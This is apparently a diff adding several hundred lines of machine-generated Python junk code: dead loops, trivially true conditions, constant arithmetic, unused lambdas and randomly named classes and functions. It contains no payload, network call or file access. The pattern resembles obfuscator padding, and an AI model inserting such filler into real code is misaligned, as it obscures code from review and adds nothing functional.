+for qlCPVdOk_8lP1I1KF in []:pass
+while False:pass
+if (45255^45255)==0:kldcIJqZ_BNu9bVua=58569^39992
+upyYIcmS_1605uf4i={191:63088,64:63183}
+sgDenDaC_YqtLFwoU=(51809*51809&173)^51809
+RxeXjFVd_SKefRNIb=(6585*6585&50)^6585
+class QXIPuDAS_9RKpRwgB:
+ def EsygyVpw_yKsbk922(self):
+  return 43065
+for fdMWwKHU_J4qTgBYl in []:pass
+QTMZfYQy_ZjosnDXu=[4604,38446,45882,2913,27132,19302,50878,60433]
+while False:pass
+DKRQdwfd_kfJBST36=[2803,1529,13260,30518,53530]
+if (45381^45381)==0:eWSqrHwR_inhF6iOH=57826^60700
+while False:pass
+def VTVkZoQT_eejzT0BB():
+ NbsbGLFv_nn5XhuEm=36911^9627
+ return 11
+HPmFKRVe_kbpz9lEw=(59287*59287&167)^59287
+class nxenrOXI_M39wPs6O:
+ def dHPtKvgf_rWAeGeVi(self):
+  return 23218
+XWYOrieg_HDUExohY=2553547410&2136188530
+class CWpzFVIN_OOxKmD4n:
+ def WqYwDzEs_DWg3C6vg(self):
+  return 2853
+if (31922^31922)==0:voKQSjMX_NZASKc7T=48034^51014
+while False:pass
+PTPziCBs_h05THVx5=(lambda _:_*10+59)
+RkydZZVm_fZjbRQvB=[8124,29880,60066]
+JCqxcjQl_9G2x1GPK={163:59488,92:59587}
+IqgLTEmZ_dduK6iNu=(29725*29725&84)^29725
+class jMAyvsvr_r1RbwFH8:
+ def ijCCHcVQ_ujz8sbay(self):
+  return 21632
+onPkxJUB_WHhAq8e0=[45527,27620,36524,55963,17032,16484]
+TxfOvGNS_HOC809zI=2047018374-1406480443
+eMceduQr_oDN9YOJd=610337621-16265758
+class MHTNdQxh_3g7zHk0j:
+ def VUQznVlb_ivuUmO3n(self):
+  return 14995
+AczHRTog_MszrGRnS={222:6726,33:6808}
+for YhpJKIQt_tiVoo9H8 in []:pass
+while False:pass
+mfuELEnr_FN1rFnWm=(43789*43789&255)^43789
+class XJbrTmNO_EyNckSKk:
+ def SxUplLeQ_Uifho7oa(self):
+  return 64483
+uWurhAeg_nNWMi4EK=4018545506&2436032808
+if (1097^1097)==0:sOrGHrEF_IcHvJ5uR=61641^45620
+for rrqqZXRC_M68YZqQ9 in []:pass
+if (7292^7292)==0:PnfZBxLM_Ml0s7kJf=31480^48721
+for uGLPhVrK_o5RnXlTp in []:pass
+aPchFaZP_s57i1WA5={72:58675,183:58747}
+iUBRFCES_oryRlduE=(lambda _:_*69+33)
+hkMkoRDl_SKa3ue0Z=(49649*49649&102)^49649
+class NlNiyxkx_nuLQeuch:
+ def ZrFxDbwk_2zP86uVZ(self):
+  return 23673
+GuwNKWwW_k4ENoj9a=(36276*36276&207)^36276
+class vgAfVUaJ_WztrtgNi:
+ def NgGgDtrx_FldnGYD4(self):
+  return 9184
+def skxoUQzV_MdtEoI7I():
+ renbfcRz_XbmcKIs8=29176^24717
+ return 24712
+while False:pass
+def eMMMVUWA_XlCAIFWr():
+ jGSvpRhD_vjIao9Y7=63947^48166
+ return 47106
+if (43359^43359)==0:LMIYiwsQ_Q3xLO4cG=35728^41789
+for YKvPnglC_3AMHhUv7 in []:pass
+GyqfWYPI_KsNDzb8b={111:35549,144:35506}
+def hfRhRdxQ_iaLi1BDl():
+ SjFlCrKj_sw0H2uQ0=30608^54641
+ return 21776
+class hSuHVDnB_iXa7NJ4Z:
+ def AFyyqAId_cTBaGwIy(self):
+  return 61313
+Frlqhlpv_aqYi40Xl=(lambda _:_*42+9)
+LWPkOCXH_AODIdQ3t=397349379+2896572336
+while False:pass
+for QMhQXZez_7KrgSjgZ in []:pass
+while False:pass
+for RGlCirEm_OUVhsDj1 in []:pass
+PlKsfbDA_0O8fZdpf={192:44440,63:44376}
+while False:pass
+while False:pass
+if (54628^54628)==0:gqAlkSJK_vvD5671s=31794^43981
+class SfbKYsGw_ovjFDEnu:
+ def yzQzyCNe_n39iVcMt(self):
+  return 16907
+def tFKnpdxY_akoL7CkE():
+ RFiJQvRZ_gMkhhgzw=64953^42701
+ return 42121
+if (60253^60253)==0:yeNhjOtc_9dTBg5Vb=40131^37730
+DrCYPIjo_C8yYP9uY=(lambda _:_*59+63)
+fKfsMtDw_3Ieywmue={101:21892,154:21985}
+TeLVKRfE_IvYrcYkt=[25239,61198,56605,26689,4216]
+class VtRZQYlI_2s7OGcWg:
+ def bghYLMlD_9io55m7y(self):
+  return 13205
+TodmjqKX_EEttXZtm={232:858,23:946}
+for fTarPWaZ_YUCF7Jtj in []:pass
+def azKVfvcP_hVS3gluK():
+ oErhthMY_KaPn1cvl=50453^58602
+ return 50176
+def dTHCClyU_WqHg4W0M():
+ wZlDlRhA_GDfgrJtO=4385^10877
+ return 33
+for Mbhkvwpm_v7O0r3Gs in []:pass
+WMPhCfmb_fIIdUUzg=(lambda _:_*47+80)
+def TrhordIY_u8n4mJO5():
+ CsTneoXV_dS3C04Jv=21017^31725
+ return 21001
+if (48756^48756)==0:sqzwoxWs_VAfDyyhr=35563^17739
+if (49916^49916)==0:RaykHmvk_rfurIoTq=35157^55324
+if (56030^56030)==0:VjahHzGO_tEWHiGts=8004^6239
+QgGQxHVo_siLb7Kp2=(lambda _:_*77+2)
+epJfoFzs_CbTG1slT=(lambda _:_*42+8)
+if (22578^22578)==0:YQhtSeLx_QtriQwGZ=55961^33747
+AmGUlPDK_6oCZffWT=(741*741&96)^741
+IkjKtACy_VjsRJkCu=[49287,47064,5192,4508]
+for GvULOVIV_UY3DAoar in []:pass
+AbYQnOIt_Y10pu1Z9=2878693497^3563109466
+ByoEJWVY_vpIWvkbg=1492005655+23512163
+ewEigjkr_Nxm4KfY3={147:14713,108:14826}
+LCmjGrxz_40oql31J=1805509667-703568020
+YbUSxqht_15vtI6E0={20:53026,235:53046}
+while False:pass
+class yudUjOJr_rvbEQxY1:
+ def seCULqjR_o6j18q1Z(self):
+  return 5387
+fmXFYmZj_wbGEYSSX=[54928,9378,27926,35556,2592,22395,54682]
+if (4817^4817)==0:jdvNuAqC_gBx68ePi=63687^55056
+while False:pass
+if (43061^43061)==0:VTLPiWwA_IkVaB7Az=60329^16518
+svTsCuJo_OkDUerRB=2075041967&4251992770
+for XlmSfPlh_50xGmYrM in []:pass
+while False:pass
+while False:pass
+def BtlnbKEd_LRc2GtXP():
+ rVAhVnXC_c82H6pXD=3036^18669
+ return 2252
+while False:pass
+vwVzRiCn_QBCgYixA=(31340*31340&241)^31340
+mgEDJjuO_ydC2WH0d=[8413,35673,33780,18550,43717,22745,11774]
+if (58699^58699)==0:TIfgbRVW_oErggvau=15775^11918
+IcCNKCre_tMNIrWvX=(17026*17026&205)^17026
+while False:pass
+if (63977^63977)==0:LqTpeHKp_Ql3Xuwqd=62223^48623
+bhjHsgSu_ytn5Fg32=255920358|1832374289
+iUhHkvZl_AXyeBUn2=[63678,13944,32526,18884,30753,4183,314,18640]
+while False:pass
+EvLvXCqw_QvJjeLFF=(lambda _:_*38+14)
+def NUuXgxGW_exTWZ8CH():
+ EzbTJuAE_Q16CqiYL=24652^70
+ return 68
+EAQczygP_6CmPKMnb={40:19818,215:19778}
+class mLHTDJKC_LRYl9vEd:
+ def wKOyyVwz_qRwiAfNp(self):
+  return 25979
+class yMdTWNLd_2j2q4hJi:
+ def QIjczsTV_jjXfy6Pd(self):
+  return 48004
+if (4802^4802)==0:nzeHkmjA_PJzTqgpo=49298^21625
+for TQlBpRIi_nUsBuCBD in []:pass
+ulwTRbih_NSho7tD1={195:63745,60:63938}
+LrpJfKxS_F1vpPwVY=1595874036^3713258938
+def QorspQUK_Tc4bmgv3():
+ aGCnbNGt_AU33wQ8q=61531^55607
+ return 53267
+tTrufOEp_9gsCKFhG=[55245,16670,60699,63247,17391,40140,63037]
+rJcIJQyR_l1ylX9VZ=(11879*11879&176)^11879
+if (50724^50724)==0:eahGzqre_U8h95CGb=60125^8746
+yOCDzqFY_yx6Jqwlx=(43127*43127&200)^43127
+MoUlFYMX_9Q8IaluF={46:12113,209:12159}
+weBhdrzb_86XmwYs7=[60323,45613,65283,30804]
+kncCCkLq_nsArIpWx=[34672,1503,34329,47045]
+QcUpNKst_2utAsKqA=[40428,6526,46978,15927,26787,7940,60202]
+KaeHpEmt_mAOYezUv={20:17279,235:17259}
+class XscFwCLL_vuOtMPfb:
+ def gvIqhMQF_ZWfwYerQ(self):
+  return 40234
+IZlFIYil_BCKnMMg0=3392082922&3917180878
+class nSqCJGsi_YSLzY4av:
+ def ggcFWpTK_rVGPJg15(self):
+  return 61105
+GSFcvMQH_C0ROVeyk=(50804*50804&211)^50804
+PpPHCAaI_zi7GJiQE={171:19246,84:19333}
+if (57357^57357)==0:DZhwLaBW_UBaH66DD=31176^18275
+HKpIekva_UHnQuCvY={231:9163,24:9004}
+if (6850^6850)==0:PbsoBlAY_L4b660R8=51934^6726
+while False:pass
+hmcWoFtF_ymbnWcyY=(59323*59323&232)^59323
+EPhyTNDD_o6rkQ6iT=(31128*31128&15)^31128
+while False:pass
+WiPwlhwO_3BH6IZG4=[49232,30935,32150,46702,56259]
+if (32022^32022)==0:uibiJehX_ulxL7eUi=36641^52292
+ScelBRrJ_tvE7VbAX=2025328776+2530433119
+def voeSKZEG_ZPmFWqC6():
+ CAMVGxMk_a38UEJTx=62761^45909
+ return 45313
+oDwpdGdL_FQowFqf9=[10996,15689,31154,28431,36502,21515,49534]
+vJhQSDlm_3K4p9onA=1262576982*3468658979
+xrQoSQlu_kAOZx79e=(lambda _:_*15+99)
+jCFnwuob_y1Cu7cY4=2537747490*698246665
+def ntSmZlkB_8T8LRAfu():
+ cFeYGBZV_hgY87TIJ=58721^24604
+ return 24576
+lqXgAzok_jMTxPwbF=[7561,30409,45340]
+KlrLBqja_voCtOJTZ=[2648,22229,6564,31212,48713,43595,10617]
+amqMsbZT_49HhGflP=(45274*45274&216)^45274
+def qdhsojjB_ByA0RgPs():
+ ybTbNCCX_vPEU99tz=17371^23448
+ return 17304
+if (26397^26397)==0:AyAMxCfM_nu7vl2Bt=59112^11268
+while False:pass
+nSksSGBf_yh4I2BoW={47:13522,208:13565}
+cNkgwTRh_VzwBRDar=(30217*30217&75)^30217
+baKzxdSf_htVogPBz={11:22492,244:22487}
+for kuzcyPvx_ARdMJQNa in []:pass
+def emAkVueR_qXaaZcww():
+ fmpHSkRM_rv5p8HZx=19027^15868
+ return 2128
+xcjsJDrA_OoDPWfNM=(lambda _:_*44+12)
+for CRKeAYYI_LSre8Xez in []:pass
+wNVwMxdp_XT57P8LI=3907186029^805520223
+yBwgsauh_lPqJQo9U={108:10464,147:10380}
+TwjqaqCs_12tZPcy9=[38123,53232,33560,31056,2105]
+while False:pass
+while False:pass
+ttecikun_20DdPUoV=[35166,1759,4542,61104]
+def TrzYyRvR_Wumldlcr():
+ fMPcZRSX_oZcufiuk=2603^8439
+ return 35
+cAcNRILq_RFSLuxGp=(36714*36714&195)^36714
+eXEQviDb_iZMqHZHf=(lambda _:_*72+25)
+if (56829^56829)==0:tajHsTXl_dPw6tevL=12649^43504
+class nrWRBRXx_obIjJHWZ:
+ def DSAxouJM_eR1zxNxN(self):
+  return 23076
+iEcHaMbk_k1lgpzRQ={81:47072,174:47025}
+class uilNoInZ_IeBdtodG:
+ def BUxTCpip_E9RA807S(self):
+  return 3564
+bsvdWODI_3n5w2WLw={242:8461,13:8703}
+iIUcCEBL_WxlGlCrY=(27093*27093&184)^27093
+viKYRBiO_KWfGXaiU=(23545*23545&93)^23545
+YfJvwzzX_dEVX7dYI=[62100,10251,45018,22253,1376]
+qWchszMC_jBZS5T5S={5:29539,250:29542}
+WZkDlOfR_h15gd0Dm=(lambda _:_*11+57)
+mFzVMmgd_msI2eX4G=544510673-1330847250
+FsPfrWCD_ubWsML6U=(31150*31150&179)^31150
+for FbeKmmuE_etBFSM4u in []:pass
+if (10398^10398)==0:oJXmdpsD_IvjDHW0l=46327^41798
+if (34553^34553)==0:EiNooRXq_7tp1OYoV=58939^36010
+if (40271^40271)==0:JMZIOrNv_nhP7t71p=21318^34122
+VjVGKSqv_KiGtF1iw=[3114,15979,49112,12628,55712]
+if (10861^10861)==0:IbqjTPSf_HVmNOocE=29478^30606
+while False:pass
+for JuRcfENF_O7HigNBp in []:pass
+for aUCzhtpX_n7PqPn34 in []:pass
+AqxUFLMW_CnsfTaEZ=[1338,43708,63337]
+def DLxGxhPz_LRsdWn4x():
+ bBoGHGhC_wksZlxqJ=50298^60122
+ return 49242
+SwwponzV_v0kll6dT=(lambda _:_*81+30)
+tfjUWTkx_OS0ArHtz={115:43317,140:43334}
+oMzjcqCD_z7yhGR4a=(10418*10418&152)^10418
+WBkOVxUp_2xq5GZ8A=(lambda _:_*54+24)
+ATjOuXqb_ZXOEs7UU=(lambda _:_*63+48)
+for jlnHeOfq_WOuFLwaW in []:pass
+if (4927^4927)==0:QgfPuFOw_S2QWgFxy=5887^62406
+sDGiCYRy_13bTODPJ=(lambda _:_*11+73)
+for IBGoxiQl_zb6h8vAj in []:pass
+def pWKyQKQP_GbVs7Jvk():
+ ZAqwGOSo_Ibv1eiWv=3690^39801
+ return 2664
+def QfljMTNP_YTFGqMRo():
+ IcXFGLpm_Q4oDbWmQ=18650^14912
+ return 2112
+FVGRjoKl_SJJwEKFR={213:12870,42:12947}
+vPWGaKdF_hHI5WaCD=1909932304*3465139964
+yuOLgZHx_2nzKqY3H=(63104*63104&182)^63104
+cKKkUlYZ_rSZ9KPlh=[7526,48680,16612,63209,39891,12156,65187]
+while False:pass
+while False:pass
+class bnIvpCyN_LJfArjuz:
+ def mXwYnTzC_jymf6bOQ(self):
+  return 25964
+if (23823^23823)==0:VvFwTlOy_IFijTJjO=17645^32231
+nfJjpawz_Qi86ladP=[43576,677,31994,64718,62178,1174]
+rULqnYdh_ZoXl23Mg=(lambda _:_*96+33)
+JaKOpwFt_FZs2U0c1=[36743,895,52291,61970,16170]
+NzNGJjnU_OcVq29xS=[64732,28595,59264,16548,272,41082]
+DgBIEpaF_IqcWF5yj=(32327*32327&144)^32327
+CLaIayLG_q8i2DFom=[39232,61639,21603,43776,10242,33129,45222,63838]
+hNUhNoll_xbEjd8lg=(lambda _:_*23+24)
+def VbOiNgxu_R5HWKUb2():
+ QILuOfkl_cUbG8ZXC=46673^26542
+ return 9728
+mgeTrCcc_5vIiDZGa=(lambda _:_*55+47)
+wuZobPTV_kYp18t72=[55572,4543,17733,24194]
+ooxVXvjR_TSTbgXvY=(19638*19638&173)^19638
+if (24367^24367)==0:xRhcustw_bhqqgHLG=36174^31630
+nvUNDzdZ_e9ZhDU6E=(33524*33524&232)^33524
+VpZQYmse_BBSM5yc9=(12589*12589&22)^12589
+def zDKkXFpu_yz5J3DcC():
+ limyQwQu_59Rj0pAU=45097^43737
+ return 40969
+quoHtytg_VnIAVCIu={167:47939,88:48100}
+def oWYNhNXm_HEHmVuWU():
+ JsGuBPDT_8G38c4OL=34394^50565
+ return 33792
+credtOeg_MHveChIc=(10910*10910&45)^10910
+while False:pass
+class HSfKxKfl_n8NQ2VJf:
+ def ZIVjQtes_GH4KEXa2(self):
+  return 47691
+NXxKkwwB_keK4i9nb=(lambda _:_*42+60)
+Qioivgpu_JWm6kgsZ=2559626680&1628695858
+wDIKAbdQ_mXyfdXwo=[25949,13312,61488,45682]
+ijBmBNxw_evYZ1dKv=(32263*32263&17)^32263
+ptyPhGsp_VO5GtCQM={249:46381,6:46548}
+wYVoVfsC_A37NHEoT=[42206,4690,35930,20287,48377,44228,49338]
+for jHgzDjVU_jCwfIdqk in []:pass
+def tQEOIjZC_tJko0lMG():
+ BuarEKHk_yWA356sn=7487^54440
+ return 5160
+while False:pass
+JBMYGnzp_IRhtDakr=(lambda _:_*31+75)
+def ipQNdfRa_bfjwQBKt():
+ snvnVwNG_Km06dAOT=39526^44319
+ return 34822
+class svBaKHSO_mGLprlE8:
+ def rgIgruKU_sxqhDxiH(self):
+  return 52535
+YSFaCCbU_M6HVQCb7=(64995*64995&132)^64995
+def NJXiLBlu_fqNnNYJn():
+ UTmNYoWv_o5MAmtxH=20714^30191
+ return 20714
+hGfvyupH_YSn8vaTn=(56889*56889&54)^56889
+xUNBcxpV_AkSL6kRc=[53525,15187,47053]
+GiovHYmg_br3LRc4n=(lambda _:_*45+61)
+while False:pass
+while False:pass
+if (40987^40987)==0:oSNHyHXi_kX3URUgh=63960^14953
+def dpOKizxM_N1b7PGYh():
+ VclecFIy_5ziP6jie=54605^42541
+ return 33805
+vXzVaLqD_UPsKPrzf=[64527,64245,33934,341,63444,24182,59372]
+NEEePoJK_zqYzLML8=(lambda _:_*72+61)
+sgeUMNsy_suomsHBX=103547230*1037445459
+xksnJRDM_Onqo3uyt=(5195*5195&230)^5195
+jTWJhbLX_kBMPb9hF=(lambda _:_*25+56)
+RmdGsfkL_0DNODZHU=(2594*2594&2)^2594
+nyAbdYRC_LhbRmpUe=[50657,52841,16599,61464,41761,20329,42291,63140]
+YHqhojuX_oEetem90=(lambda _:_*20+62)
+NazuLirx_OphcT5do=2916315818+234528062
+daSansdA_ImxaPBvw={145:52150,110:52007}
+jJlFQygC_qBBScAB6=2687573812^1459587292
+for pNjuBYfR_zomWMAuK in []:pass
+while False:pass
+while False:pass
+if (56775^56775)==0:eRCHiUEP_2cwHgcFT=49568^26190
+if (53786^53786)==0:hLqrKoye_WZ2BVEuF=23316^20629
+zYtvkrHW_Y3kMUXtE=(63477*63477&38)^63477
+PEkhcBzy_hi4jMr39=4016111927^1310893830
+MpNBoaVH_8m3iQYUi=[45946,2823,52161,28234]
+rJJkhoeV_sxUwqNif=(57723*57723&233)^57723
+if (28767^28767)==0:ifGFJSgR_uDvAErd2=59586^20601
+tCGjbwsM_x1n7czIt={45:61149,210:61168}
+EAsmPdXp_g8qgkg7J={255:55114,0:55221}
+uordlUrQ_udvhq2XN=(lambda _:_*15+78)
+umyLzqqG_4iNB979X=(lambda _:_*44+94)
+if (51067^51067)==0:vxmJcIHB_kIFiIeUw=57528^60771
+oiqziMVi_Q9e7q0sj={13:18892,242:18881}
+tmornKmK_qqa6gKFb=2930058256+3775808001
+CMUbpvmF_ImH8dqrf=[10159,2551,51478,15126,2927,34063,57477,56049]
+LEjhuLeC_1wDJWmzA=(lambda _:_*55+91)
+SgrOeMzp_lOFAIu1s=(26996*26996&202)^26996
+TOqBFRDL_dheZ9aNI=(7445*7445&234)^7445
+UsaMdPyc_GVPpsvMy=(57088*57088&239)^57088
+hMeitsqV_XpfEqA4f=245173706|1300136437
+XmOYQgfn_0OPsuj5w=[10331,23465,25512,54943,51667]
+while False:pass
+while False:pass
+for TbLLrlla_u37f8ibG in []:pass
+if (30750^30750)==0:oixKNrhq_Yzyf1Gln=28857^12676
+if (57868^57868)==0:nSXTveJN_Ka7E1qW8=39327^18864
+while False:pass
+dcLcqFqF_x8k9o1jT=1660064005+4028228648
+HTlFZHKc_4bQjjqTP=[55690,37198,17447,24193]
+mzTjpaSS_wxC67nNy=(lambda _:_*79+29)
+def krrkKnER_vD8Mx2HS():
+ RJvdIbET_y8vRlNmg=58563^28080
+ return 25728
+riKWYNLt_3GCoPONA=[21805,15813,1252,28790,35657,44891]
+DirYsQOP_Qe3kTYxG=1932400271^4075110906
+bfsZnFsz_7CtGIImx=827057764^2525212931
+for DzUbHHGV_34t4fpCN in []:pass
+fPtxjZsM_nf2fb8dL=(lambda _:_*63+44)
+naljyyOj_LL2zI0qO=(lambda _:_*99+71)
+class uvzAcNme_kd3zMf1R:
+ def mZApCfIV_HWgnRz5Z(self):
+  return 8763
+Sbjevlhl_njaBrupL=[3017,39272,16450]
+while False:pass
+yKXLbAke_xJM1BR1W=(58309*58309&121)^58309
+while False:pass
+while False:pass
+AGVcfEHY_OC1XGhf1=(lambda _:_*28+6)
+orupfWsn_7GXsF60b=(15038*15038&189)^15038
+yPieNkBY_TGZdH6gQ=46509416|3245253784
+def kNqhPtIb_MJjxN4jK():
+ CSPNnxPi_2Ok2av9O=4655^5310
+ return 4142
+BgFoqfbz_9U8bJlpQ={85:25168,170:25093}
+if (23709^23709)==0:NMvTEzBw_qdUyTGsd=59088^18723
+ONHwqAAY_fITGNOMs={168:1899,87:1987}
+xCEXciwy_G4JX0U4F=1033765021-2770675404
+OqlKRrXy_Htp0DzFT={103:51166,152:51129}
+for qVIoFMZc_P6Oxrs3y in []:pass
+rbKykoaC_qRSuxP4h=2200767756-3073610239
+FYGJYbei_vw4mD8f3=1345224358&3926429901
+LyvWsqXH_61gioGhQ=[15000,16040,14290,4181]
+if (32139^32139)==0:bUJoukVF_yRPcbnx8=11473^52041
+CSkihzbu_x0UAzD6m=(lambda _:_*81+84)
+while False:pass
+while False:pass
+while False:pass
+gdXWcCxN_76XAoF1v={202:8921,53:8723}
+JhgDPubI_sbvNixjJ=[45280,36851,16248,32362,37141,44486,3814,22888]
+if (49234^49234)==0:ZtIfaqPD_3td0f9Rw=3153^62702
+yTMLaquN_4Gu02iR7=(38418*38418&84)^38418
+if (40276^40276)==0:NRrtfQDg_GtQWzk0G=26321^9147
+while False:pass
+zvpeALxm_KyyzMi0v=(30008*30008&220)^30008
+class fOKjBvUY_tyS5qC8S:
+ def JTsIGsKI_bUOgTlTq(self):
+  return 44668
+for brBFRmrg_NCqYj6MJ in []:pass
+BCmncsis_8X1P0zZh=3258383354*2065287885
+aEuoaJVg_Ve1rMNfh=(lambda _:_*81+83)
+if (17284^17284)==0:bGpbCRgw_RY7dN4IB=21707^2369
+eeHlYZuy_S5EOpxZo=(lambda _:_*6+46)
+tDKGqXGB_zahmCHHB=(lambda _:_*9+91)
+EDkjZbhG_zLOA21yc=(lambda _:_*28+1)
+ghbsqtmM_ku3DUgsN=1532790371&3724347397
+FFBjKRnL_qwN4w26W={138:10092,117:10214}
+hUBPocCw_f74IgfgN={166:8142,89:8040}
+VtAyrxWq_BuaVNGGD=(lambda _:_*22+86)
+for JxBCMGNk_IYBNl2D1 in []:pass
+wkBDMash_lL4mWTcy=(lambda _:_*98+2)
+for UCqaKokP_j3EBasjD in []:pass
+komlLgqR_j7QSv1Qj=3348478534^3624804459
+UncCfNfF_aDRNM5iA={139:48199,116:48332}
+def xEgPoDVz_EjNXwZrk():
+ lJosSeHe_vG64ADVV=25440^9713
+ return 8544
+AWggbLHX_Gb1x24zo=[55828,60965,54420,37174,25739,49673,6101]
+cWxgXfxS_kwtOJzaZ=(42995*42995&45)^42995
+class MwqlcGjP_KQnhHd0p:
+ def QVOVASAw_azm1pWbv(self):
+  return 57422
+nafPkRPs_aBRloVgY=[28873,51646,8663]
+class ExwPYBXh_ltvsIrRa:
+ def pvBvHpvv_fjN8TApm(self):
+  return 49991
+def jYUwOLuk_MBkHA55j():
+ kgURrtkN_1SlF5R2b=51684^47945
+ return 35136
+class VQbxaZed_iXQTmjW8:
+ def SRtJyjnj_rDqaWZtl(self):
+  return 28116
+lJPNwZKl_6XbKCjKU=[47143,41233,42359,31324,52902,60261,13156]
+if (20659^20659)==0:MhoRcxfm_ThCEkzMp=1106^30610
+KmqsFglw_sTCKlSYl={133:19594,122:19471}
+while False:pass
+class nOLsMChY_MUAmNkwB:
+ def HMSZpUHj_c8pZT6pQ(self):
+  return 5790
+ldTKUPFc_oWdKO04m={9:41442,246:41451}
+while False:pass
+xMnUsGbH_ZPK4Hq6i=[38740,63078,36065]
+qJvGwNrC_XetjRMxn=(32957*32957&246)^32957
+hmhZuiJm_wH1X4L7s=(29918*29918&170)^29918
+for BxcSyrGc_OvDbdh7S in []:pass
+class wbpuRsnW_iXN47mjf:
+ def wPUUTeZj_nJMedTDL(self):
+  return 3714
+class bcwnRpDK_54L3llI1:
+ def zbccvldH_eZhire8z(self):
+  return 12686
+while False:pass
+def mbDtdrqK_xl5743h4():
+ KTstqAiY_5uJIVNf7=33251^42734
+ return 32994
+while False:pass
+if (25192^25192)==0:qVekIMBj_gcL2ZHvW=26639^32377
+WDPHsEXX_yJrceZmo=[44501,2998,49865,20332,44164,4636,63274,6916]
+hguWtrFR_Xt9yZmjq=(64091*64091&77)^64091
+def gaBzRzSY_Sn9z8gHV():
+ prCaazmr_JBv7xlJR=10640^54251
+ return 384
+if (10693^10693)==0:atxQRvGp_fDMGiH3L=29572^46699
+def VptXamVv_wWZTXYel():
+ rdfcAhIF_UZWwJmGy=30065^41500
+ return 8208
+bXRsUOgx_7ccOGn5J=1578669176*1409863702
+if (40157^40157)==0:VBbLIJzE_tiEIlpoH=28507^30183
+qIOonFDf_TSHaZ3KL=[43103,12688,26729,63382,8841,11993,25239,9981]
+while False:pass
+mTXupVUt_dm5VDmsN={139:11673,116:11538}
+for LanfHwuU_a4sInDwm in []:pass
+while False:pass
+class SxGhZSbI_jm1870Lh:
+ def BcrlwtMl_tAzO7lQD(self):
+  return 4010
+if (62452^62452)==0:bGMkKQgc_nS8L4bci=51370^48819
+while False:pass
+for UchWsCZu_1rNurzIw in []:pass
+SSPFxZxU_pc1RmQUT=1524429928&3263007825
+xjJyEHyL_wq5BICxa=[19397,63123,5327,12210,60584,39534]
+CMEeQoiH_YLvFNd5L=[49273,4859,51537,56713]
+ROeuDNjS_o10G7oD9=2346514564*2929179845
+if (64847^64847)==0:rqOhLHwA_aCU3Pvee=39094^50885
+def uyyOQrPi_VWmV0IJp():
+ uFJMCKSN_M4z05B2b=2422^31932
+ return 2100
+for LfXlEWcj_Qeb4vJae in []:pass
+for BHpHatfV_UfGi16Qi in []:pass
+JwViYkEW_icnuTenb=[47638,6981,16467,23971,18653,29967]
+cVqUDqyR_aLdWbnQ0=[4572,36085,677,56498,9325,54392]
+AzCUqZZn_gwWyPNm0=(lambda _:_*5+20)
+class dFvIWIBZ_6k6jlLCu:
+ def tLskpERf_IpGMXQpM(self):
+  return 13298
+NEydzPWM_3WdUkpsK={245:58830,10:58683}
+class QoHHMLOV_BbCxVu5l:
+ def XwNOajdk_VLg8rKx4(self):
+  return 42311
+if (9551^9551)==0:kfXBSfFA_SafDFNFz=6393^52686
+fkSzBYmC_FxVRitpy=3328156892|2471449540
+if (43384^43384)==0:JhmhDysk_5gJc6lwN=29127^33954
+def rjtRIqtI_IDNKJKr8():
+ ggQeooUx_SgWooP01=61246^35587
+ return 35586
+qOqMnLyJ_MC3cp7yV={238:15203,17:15245}
+rbhqgrjB_VymFTJx7={20:33983,235:33963}
+def ZYBDLAgS_dfOPJxne():
+ tFvBxlqu_cVjzueeY=46239^6211
+ return 4099
+ZswiCurS_ee5Fp89J=(lambda _:_*44+63)
+LfNTsoxq_XB8x4ZHK=[7501,37348,60079,57280]
+jLBuUjYs_yaPOQV3F={232:30479,23:30695}
+while False:pass
+qWHzGsVb_MjB1v8Jg=[14587,57892,5833,22624,52989,58122,34376]
+eBdDkepE_PrVEdwC7={88:31971,167:31931}
+for ZsueudwG_STgksTrq in []:pass
+if (15160^15160)==0:BGcBApBd_d6gMjUJl=61615^45400
+gSKWcvMD_RkuSJbNZ={36:31639,219:31667}
+for HJmKpPVO_1mOeUGcx in []:pass
+while False:pass
+QaOMFZoZ_3g7yuTIf=[31826,60948,33819,11373,61665,53136,24483,59048]
+while False:pass
+if (24094^24094)==0:RFiBAdpZ_sqWpKrSS=25500^689
+qrwDpYDZ_qXoQteYD=(lambda _:_*27+92)
+if (42040^42040)==0:TiVNjbHo_yk8TgqJ5=2151^35745
+tZxUkEwI_rbw5kFA3={60:2953,195:2997}
+oEabpbny_0cOKx70J=81947752^2667850108
+BsnBkYmt_kN9RKlc5=(40551*40551&168)^40551
+vOEyBfFy_rOq7fOf2=[34556,52405,32598,16728,34045,18165]
+for qdiXkqVP_ZQY6x7dt in []:pass
+AJEfpZIM_s6ymK7XH=[34944,31091,38714,11538]
+def yAkqFYnA_1McyYkTp():
+ OaawVtGP_4wJQGWbR=45174^65135
+ return 45158
+EmiTQPHX_xIsuBdAQ=342132067+1302263392
+fbZowFkv_iHyEwBU7=80559339^404641426
+oKZXimua_pnyZLJUH=(lambda _:_*86+57)
+FJvKDiwU_nZZVjmm2=709564693-3073131487
+VMioXxnc_DJMj6AMK=1338769863&4015091110
+XEeHuNOA_wlBpsGNT=(47481*47481&59)^47481
+pxkOWQiY_bviAuR4l=1718173966+2045662557
+IYxGRrZn_gOFc1clK=(49985*49985&24)^49985
+VYTjgwBB_3iMvpLy2={86:59801,169:59855}
+if (32478^32478)==0:dxWjPlrH_DNxW2m84=19371^40881
+DyiJjLyk_pcwY24mx=837589980+745799947
+mLfqhryN_ndIDoRI0=(53928*53928&171)^53928
+ovPqnNQV_rnADO6mP=(lambda _:_*35+96)
+UfYMmKWI_Wm5IG9Nw={126:36770,129:36828}
+wWNwNgsA_U2icThxD=(13177*13177&37)^13177
+class JowPJAff_UhZDe3uY:
+ def kdZkolvD_llUyRvU9(self):
+  return 21160
+if (61736^61736)==0:plrPNrml_zXICCm82=6153^8392
+if (44288^44288)==0:MSwMEqpo_CHCOfJF4=9139^37101
+def KMWXAJND_aLhwjDGy():
+ TBPAYBqr_6sTihMUP=41538^52423
+ return 32834
+class ODoJQtIV_oKFi1Xap:
+ def uqVtxexD_3daz4Dqj(self):
+  return 24704
+ielVfdoe_5yjESBiT={19:54161,236:54146}
+if (62926^62926)==0:ApkUiVBa_0Jz6g0cP=33196^30884
+while False:pass
+BrYZEEli_T4QxfRnd=880651918&2004412409
+uSBbwywS_Yqd9r1FW={90:35472,165:35530}
+if (7644^7644)==0:bweKhOcs_XwzF8ELr=8835^16894
+sJSnpcVD_jVsEjOQ2=2230321794*3915776532
+while False:pass
+for CcxgDQeI_V1WgJfng in []:pass
+for rtVrYFXV_5bEngiCm in []:pass
+for MvqKBotM_G5V2cn6F in []:pass
+JinhYvtY_UppCqvDq={202:29917,53:29719}
